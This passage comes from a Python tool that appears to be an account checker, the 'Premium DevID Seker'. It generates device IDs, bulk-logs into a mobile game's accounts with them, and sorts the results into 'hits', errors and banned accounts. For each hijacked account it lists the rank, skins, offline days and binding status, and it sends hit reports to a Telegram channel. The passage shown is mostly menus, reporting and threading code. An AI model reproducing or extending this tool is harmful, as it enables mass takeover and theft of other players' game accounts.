                f"{Fore.GREEN}Hit:{h}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}Err:{se}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{inv} ({speed:.1f}/s){Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
        
        else:
            with stats['lock']:
                stats['invalid'] += 1
                h = stats['hit']
                se = stats['still_error']
                b = stats['banned']
                inv = stats['invalid']
            
            sys.stdout.write(
                f"\r{Fore.LIGHTBLACK_EX}✗{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{device[:35]}... → INVALID | "
                f"{Fore.GREEN}Hit:{h}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}Err:{se}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{inv} ({speed:.1f}/s){Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(check_one, devices))
    
    duration = time.time() - stats['start_time']
    
    # Build report
    report_lines = [
        "=" * 80,
        "PREMIUM DEVID SEKER — DEEP CHECK REPORT",
        f"Generated: {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}",
        f"Source: Error Hits File",
        f"Total Devices: {len(devices)}",
        f"Duration: {duration:.1f}s | Speed: {len(devices)/max(duration,1):.2f}/s",
        f"Retries: {DEEP_CHECK_RETRIES}",
        "=" * 80,
        "",
        "═══ SUMMARY ═══",
        f"✅ NEW HITS       : {stats['hit']}",
        f"⚠️  STILL ERROR    : {stats['still_error']}",
        f"🚫 BANNED         : {stats['banned']}",
        f"❌ INVALID        : {stats['invalid']}",
        "",
    ]
    
    if new_hits:
        report_lines += ["═" * 80, f"═══ ✅ NEW HITS ({len(new_hits)}) ═══", "═" * 80, ""]
        for i, h in enumerate(new_hits, 1):
            report_lines += [
                f"───── HIT #{i} ─────",
                f"Device ID    : {h['device']}",
                f"Role ID      : {h['acc']} ({h['zone']})",
                f"Nickname     : {h['nickname']} (Lv.{h['level']})",
                f"Rank         : {h['current_rank']}",
                f"Max Rank     : {h['highest_rank']}",
                f"Skins        : {h['skin_count']}",
                f"Heroes       : {h['hero_count']}",
                f"V2L          : {h['v2l_status']}",
                f"Mt           : {h['mt_status']}",
                f"Mt mail      : {h['mt_mail_status']}",
                f"3rd          : {h['third_party_status']}",
                f"Offline      : {h['offline_days']}",
                ""
            ]
    
    if still_errors:
        report_lines += ["═" * 80, f"═══ ⚠️ STILL ERROR ({len(still_errors)}) ═══", "═" * 80, ""]
        for i, e in enumerate(still_errors, 1):
            report_lines += [
                f"───── STILL ERROR #{i} ─────",
                f"Device ID    : {e['device']}",
                f"Reason       : {e['reason']}",
                f"Attempts     : {e['attempts']}",
                ""
            ]
    
    with open(FILES["deep_check_report"], 'w', encoding='utf-8') as f:
        f.write("\n".join(report_lines))
    
    # Display summary
    print(f"\n{Fore.CYAN}{'─'*80}{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}✓ Deep Check Complete!{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total Devices : {len(devices):,}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}✅ NEW HITS    : {stats['hit']:,}{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA}⚠️  STILL ERROR : {stats['still_error']:,}{Style.RESET_ALL}")
    print(f"  {Fore.RED}🚫 BANNED      : {stats['banned']:,}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTBLACK_EX}❌ INVALID     : {stats['invalid']:,}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Duration      : {duration:.1f}s{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}📄 Report:{Style.RESET_ALL}")
    print(f"  {FILES['deep_check_report']}")
    print(f"  {FILES['deep_check_hits']}")
    
    # TG send
    if stats['hit'] > 0 or stats['still_error'] > 0:
        print(f"\n{Fore.CYAN}📤 Sending to Telegram...{Style.RESET_ALL}")
        
        if new_hits:
            hits_caption = (
                f"✅ <b>DEEP CHECK — NEW HITS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 New Hits: <b>{len(new_hits)}</b>\n"
                f"📊 Total Checked: <b>{len(devices)}</b>\n"
                f"⏰ {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
                f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
            )
            send_telegram_document(FILES["deep_check_hits"], hits_caption)
        
        report_caption = (
            f"📋 <b>DEEP CHECK REPORT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ New Hits   : <b>{stats['hit']}</b>\n"
            f"⚠️  Still Error: <b>{stats['still_error']}</b>\n"
            f"🚫 Banned     : <b>{stats['banned']}</b>\n"
            f"❌ Invalid    : <b>{stats['invalid']}</b>\n"
            f"📊 Total      : <b>{len(devices)}</b>\n"
            f"⏰ {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
            f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
        )
        if send_telegram_document(FILES["deep_check_report"], report_caption):
            print(f"{Fore.GREEN}✓ Sent to Telegram!{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")


def view_error_hits():
    """Menu [8] — View Error Hits"""
    print_header("📋 ERROR HITS")
    
    error_file = FILES["error_hits"]
    if not os.path.exists(error_file):
        print(f"{Fore.RED}✗ No Error Hits file!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
        return
    
    devices = parse_error_hits_file(error_file)
    
    if not devices:
        print(f"{Fore.RED}✗ No devices!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}✓ Total Error Hits: {len(devices)}{Style.RESET_ALL}\n")
    
    for i, d in enumerate(devices[:20], 1):
        print(f"{Fore.YELLOW}[{i}]{Style.RESET_ALL} {d['device'][:55]}...")
        print(f"     Acc: {d['acc']} ({d['zone']}) | Reason: {d['reason'][:50]}")
    
    if len(devices) > 20:
        print(f"\n{Fore.LIGHTBLACK_EX}... +{len(devices)-20} more{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}💡 Use Menu [9] to Deep Check these devices{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 13. REPORT
# ────────────────────────────────────────────────────────────────

def send_hits_report_to_tg():
    print_header("📄 SEND FULL REPORT")

    with HIT_LIST_LOCK:
        normal = list(HIT_LIST)
        errors = list(ERROR_HIT_LIST)
    
    total = len(normal) + len(errors)
    if total == 0:
        print(f"{Fore.RED}✗ No hits!{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Enter...{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}Normal : {len(normal)}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Error  : {len(errors)}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Total  : {total}{Style.RESET_ALL}\n")

    if input(f"{Fore.YELLOW}Send? (y/n): {Style.RESET_ALL}").lower() != 'y':
        return

    report_path = os.path.join(
        OUTPUT_DIR, FOLDERS["reports"],
        f"hits_report_{datetime.now(TZ_WIB).strftime('%Y%m%d_%H%M%S')}.txt"
    )

    lines = [
        "=" * 80,
        "PREMIUM DEVID SEKER — FULL HITS REPORT",
        f"Generated: {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}",
        f"Mode: {CHECK_MODE}",
        f"Normal: {len(normal)}",
        f"Error : {len(errors)}",
        f"Total : {total}",
        f"By: {ADMIN_USERNAME_DISPLAY}",
        "=" * 80, "",
        "═══ 🟢 NORMAL HITS ═══", ""
    ]

    for i, h in enumerate(normal, 1):
        lines += [
            f"───── NORMAL HIT #{i} ─────",
            f"Device ID    : {h.get('device', '')}",
            f"Role ID      : {h.get('acc', '?')} ({h.get('zone', '?')})",
            f"Nickname     : {h.get('nickname', 'N/A')} (Lv.{h.get('level', '?')})",
            f"Rank         : {h.get('rank', 'N/A')}",
            f"Max Rank     : {h.get('max_rank', 'N/A')}",
            f"Skins        : {h.get('skin', 0)}",
            f"Heroes       : {h.get('hero', 0)}",
            f"V2L          : {h.get('v2l', 'N/A')}",
            f"Mt           : {h.get('mt', 'N/A')}",
            f"Mt mail      : {h.get('mt_mail', 'N/A')}",
            f"3rd          : {h.get('3rd', 'N/A')}",
            f"Offline      : {h.get('offline', 'N/A')}",
            f"Last Online  : {h.get('last_online', 'N/A')}",
            f"Created      : {h.get('created', 'N/A')}",
            f"Mode         : {h.get('mode', 'N/A')}",
            ""
        ]

    if errors:
        lines += ["", "═══ 🔴 ERROR HITS ═══", ""]
        for i, e in enumerate(errors, 1):
            lines += [
                f"───── ERROR #{i} ─────",
                f"Device ID    : {e.get('device', '')}",
                f"Role ID      : {e.get('acc', '?')} ({e.get('zone', '?')})",
                f"Reason       : {e.get('reason', 'N/A')}",
                f"Mode         : {e.get('mode', 'N/A')}",
                f"Time         : {e.get('time', 'N/A')}",
                ""
            ]

    with open(report_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(lines))

    caption = (
        f"📄 <b>FULL REPORT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Normal: <b>{len(normal)}</b>\n"
        f"🔴 Error : <b>{len(errors)}</b>\n"
        f"📊 Total : <b>{total}</b>\n"
        f"⏰ {datetime.now(TZ_WIB).strftime('%H:%M:%S WIB')}\n"
        f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
    )

    if send_telegram_document(report_path, caption):
        print(f"{Fore.GREEN}✓ Sent!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Failed{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 14. STATS + UTILS
# ────────────────────────────────────────────────────────────────

def show_stats():
    print_header("📊 STATISTICS")
    with COUNTER_LOCK:
        print(f"{Fore.CYAN}Rank:{Style.RESET_ALL}")
        for r in ['warrior','elite','master','gm','epic','legend','mythic']:
            c = HIT_COUNTERS.get(r, 0)
            color = Fore.MAGENTA if r == 'mythic' else Fore.CYAN if r == 'legend' else Fore.WHITE
            print(f"  {r.capitalize():<12}: {color}{c:,}{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}V2L:{Style.RESET_ALL}")
        print(f"  Active    : {Fore.GREEN}{HIT_COUNTERS.get('v2l_active', 0):,}{Style.RESET_ALL}")
        print(f"  Inactive  : {Fore.YELLOW}{HIT_COUNTERS.get('v2l_inactive', 0):,}{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Special:{Style.RESET_ALL}")
        print(f"  Sultan    : {Fore.YELLOW}{HIT_COUNTERS.get('sultan', 0):,}{Style.RESET_ALL}")
        print(f"  Banned    : {Fore.RED}{HIT_COUNTERS.get('banned', 0):,}{Style.RESET_ALL}")

    with HIT_LIST_LOCK:
        print(f"\n{Fore.CYAN}Session:{Style.RESET_ALL}")
        print(f"  Normal H : {Fore.GREEN}{len(HIT_LIST):,}{Style.RESET_ALL}")
        print(f"  Error H  : {Fore.MAGENTA}{len(ERROR_HIT_LIST):,}{Style.RESET_ALL}")

    # Count error hits file
    err_devices = parse_error_hits_file(FILES["error_hits"])
    print(f"\n{Fore.CYAN}Error Hits File: {Fore.MAGENTA}{len(err_devices):,}{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Enter...{Style.RESET_ALL}")

def run_cleanup():
    import shutil
    print_header("🗑️ CLEAN")
    if input(f"{Fore.RED}Confirm? (y/n): {Style.RESET_ALL}").lower() == 'y':
        shutil.rmtree(OUTPUT_DIR)
        ensure_dirs()
        print(f"{Fore.GREEN}✓ Cleaned{Style.RESET_ALL}")
    input(f"{Fore.CYAN}Enter...{Style.RESET_ALL}")

def test_telegram():
    print_header("📨 TEST TG")
    if send_telegram(f"🔔 Test — {ADMIN_USERNAME_DISPLAY}"):
        print(f"{Fore.GREEN}✓ Sent{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Failed{Style.RESET_ALL}")
    input(f"{Fore.CYAN}Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 15. GENERATOR MENU
# ────────────────────────────────────────────────────────────────

def run_generator_menu():
    global OEM_MODE
    print_header("🔨 GENERATE")

    print(f"{Fore.CYAN}OEM Mode:{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} OEM A (Verified)")
    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} OEM B ({len(OEM_B_POOL)} pool)")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} OEM C ({len(OEM_C_POOL)} pool)")
    print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} ⭐ OEM D (8 Real Formats)")
    print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} MIX (90/10)")
    print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} MIX_ABC (70/15/15)")
    print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} MIX_ABCD (30/30/20/20)")
    print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Back\n")

    choice = input(f"{Fore.CYAN}Choose (0-7): {Style.RESET_ALL}").strip()
    mode_map = {'1':'A','2':'B','3':'C','4':'D','5':'MIX','6':'MIX_ABC','7':'MIX_ABCD'}
    if choice == '0' or choice not in mode_map:
        return
    OEM_MODE = mode_map[choice]
    print(f"\n{Fore.GREEN}✓ Mode: {OEM_MODE}{Style.RESET_ALL}\n")

    size = input(f"{Fore.CYAN}Size MB (default 10): {Style.RESET_ALL}").strip()
    size = float(size) if size else 10.0
    threads = input(f"{Fore.CYAN}Threads (default 16): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 16

    run_generator(size, threads)
    input(f"\n{Fore.CYAN}Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 16. SINGLE CHECK
# ────────────────────────────────────────────────────────────────

def run_single_check():
    print_header("🔍 SINGLE CHECK")
    dev = input(f"{Fore.YELLOW}Device ID: {Style.RESET_ALL}").strip()
    if not dev: return
    
    print(f"\n{Fore.CYAN}Checking...{Style.RESET_ALL}")
    acc, zone, stat = GameLogin(dev).run()
    if not acc or not zone:
        print(f"{Fore.RED}✗ Login failed: {stat}{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Enter...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}✓ acc={acc} zone={zone}{Style.RESET_ALL}")
    
    result = process_direct(dev, acc, zone)
    status = result.get('status')
    
    if status == 'SUCCESS':
        d = result['data']
        print(f"\n{Fore.GREEN}🟢 NORMAL HIT{Style.RESET_ALL}")
        print(f"  Nickname : {d['nickname']} (Lv.{d['level']})")
        print(f"  Rank     : {d['current_rank']}")
        print(f"  Skins    : {d['skin_count']}")
        print(f"  V2L      : {d['v2l_status']}")
        print(f"  Mt       : {d['mt_status']} | Mt mail: {d['mt_mail_status']} | 3rd: {d['third_party_status']}")
        print(f"  Offline  : {d['offline_days']}")
    elif status == 'ERROR_HIT':
        print(f"\n{Fore.MAGENTA}🔴 ERROR HIT{Style.RESET_ALL}")
        print(f"  Reason: {result.get('reason')}")
        save_error_hit(dev, acc, zone, result.get('reason'), 'DIRECT')
    elif status == 'BANNED':
        print(f"\n{Fore.RED}🚫 BANNED{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}✗ FAIL{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 17. MAIN MENU
# ────────────────────────────────────────────────────────────────

def main():
    ensure_dirs()
    while True:
        print_header("🔥 PREMIUM DEVID SEKER v10.0 🔥")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Generate Device IDs")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Bulk Check (DIRECT/API/BOTH)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Statistics")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Clean Output")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Test Telegram")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} 🔍 Single Check")
        print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} 📄 Send Full Report (TG)")
        print(f"{Fore.YELLOW}[8]{Style.RESET_ALL} 📋 View Error Hits")
        print(f"{Fore.YELLOW}[9]{Style.RESET_ALL} 🔬 {Fore.GREEN}DEEP CHECK{Style.RESET_ALL} — Re-check Error Hits")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Exit\n")

        choice = input(f"{Fore.CYAN}Choose (0-9): {Style.RESET_ALL}").strip()

        if choice == '0':
            print(f"\n{Fore.GREEN}Goodbye! — {ADMIN_USERNAME_DISPLAY}{Style.RESET_ALL}")
            break
        elif choice == '1': run_generator_menu()
        elif choice == '2': run_bulk_detail()
        elif choice == '3': show_stats()
        elif choice == '4': run_cleanup()
        elif choice == '5': test_telegram()
        elif choice == '6': run_single_check()
        elif choice == '7': send_hits_report_to_tg()
        elif choice == '8': view_error_hits()
        elif choice == '9': run_deep_check()
        else: print(f"{Fore.RED}Invalid.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()